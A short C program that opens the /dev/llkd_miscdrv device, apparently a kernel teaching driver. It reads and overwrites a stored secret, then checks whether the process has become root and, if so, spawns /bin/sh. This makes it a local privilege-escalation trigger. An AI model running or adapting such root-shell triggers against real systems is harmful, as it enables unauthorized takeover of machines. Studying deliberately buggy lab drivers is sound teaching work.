#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    printf("uid %d\n", getuid());
    FILE *fp = fopen("/dev/llkd_miscdrv", "rw+b");

    if (fp == NULL)
    {
        fputs("could not open /dev/llkd_miscdrv\n", stderr);
        exit(1);
    }

    char buf[8192] = { '1' };

    fread(buf, sizeof buf, 1, fp);

    printf("old secret: %s\n", buf);

    time_t rawtime;
    struct tm * timeinfo;

    time (&rawtime);
    timeinfo = localtime (&rawtime);
    char *a = asctime(timeinfo);

    strncpy(buf, a, strlen(a) + 1);
    fwrite(buf, strlen(a) + 1, 1, fp);
    fflush(fp);
    fread(buf, sizeof buf, 1, fp);
    printf("and now it is: %s\n", buf);

    fclose(fp);

    printf("new uid %d\n", getuid());

    if (getuid() == 0)
    {
        printf("we are root\n");
        execl("/bin/sh", "sh", (char *)NULL);
    }

    return 0;
}
